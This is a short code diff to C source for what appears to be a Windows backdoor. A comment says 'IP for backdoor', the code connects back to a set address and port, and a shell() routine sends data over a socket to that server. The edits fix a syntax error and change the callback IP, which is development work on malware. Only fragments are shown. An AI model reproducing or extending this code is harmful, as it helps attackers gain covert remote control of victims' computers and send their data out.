@@ -48,7 +48,7 @@ void shell() {
       }
       // send total to the server
       send(sock, total, sizeof(total), 0);
-      fclose()
+      fclose();
     }
 
   }
@@ -67,7 +67,7 @@ int APIENTRY main(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCm
   WSADATA wsaData; // windows socket object
 
   // IP for backdoor
-  ip = "192.168.1.10";
+  ip = "192.168.1.111";
   port = 6969;
 
   // check for sock initialization
